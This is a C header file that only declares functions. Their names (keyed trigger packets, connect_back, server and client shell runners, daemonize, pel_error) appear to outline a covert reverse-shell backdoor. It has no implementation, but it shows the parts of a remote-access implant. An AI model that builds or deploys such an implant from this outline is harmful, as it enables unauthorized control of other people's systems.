/* functions.h - some functions */

void timeout(int n);
void set_timeout(int n);
int send_packet(char key[14], unsigned long int ip, int port);
int usage(char *program);
unsigned long int resolve(char *hostname);
int start_daemon(char *key);
int client_runshell(int server, char *command);
void pel_error( char *s );
int connect_back(unsigned int ip);
int server_runshell(int client);
int daemonize();
int wait_for_packet();

